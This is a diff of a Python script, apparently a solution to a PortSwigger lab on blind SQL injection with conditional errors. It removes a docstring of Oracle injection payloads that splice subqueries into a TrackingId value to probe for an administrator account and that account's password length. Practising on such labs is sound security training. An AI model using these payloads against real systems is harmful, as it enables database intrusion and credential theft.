@@ -1,11 +1,3 @@
-"""
-WHERE TrackingID = 'TRACKIN_ID' || (SELECT '' FROM users WHERE rownum = 1)--'
-WHERE TrackingID = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)--'
-WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)--'
-WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')--'
-WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')--'
-WHERE TrackingId = 'MZUrpMGj66oHBz2C' || (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')--'
-"""
 # https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
 
 import requests
